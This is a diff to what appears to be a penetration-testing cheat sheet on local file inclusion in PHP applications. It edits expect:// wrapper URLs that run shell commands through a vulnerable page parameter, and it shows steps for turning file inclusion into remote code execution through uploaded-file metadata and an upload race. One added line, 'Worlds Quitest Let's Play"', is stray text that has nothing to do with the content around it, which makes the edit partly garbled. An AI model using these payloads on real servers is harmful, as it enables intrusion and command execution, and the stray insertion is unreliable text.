@@ -174,8 +174,8 @@ Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://ex
 ### Wrapper expect://
 
 ```powershell
-http://example.com/index.php?page=php:expect://id
-http://example.com/index.php?page=php:expect://ls
+http://example.com/index.php?page=expect://id
+http://example.com/index.php?page=expect://ls
 ```
 
 ### Wrapper input://
@@ -245,7 +245,7 @@ http://example.com/index.php?page=path/to/uploaded/file.png
 In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
 
 ## LFI to RCE via upload (race)
-
+Worlds Quitest Let's Play"
 * Upload a file and trigger a self-inclusion.
 * Repeat 1 a shitload of time to:
 * increase our odds of winning the race
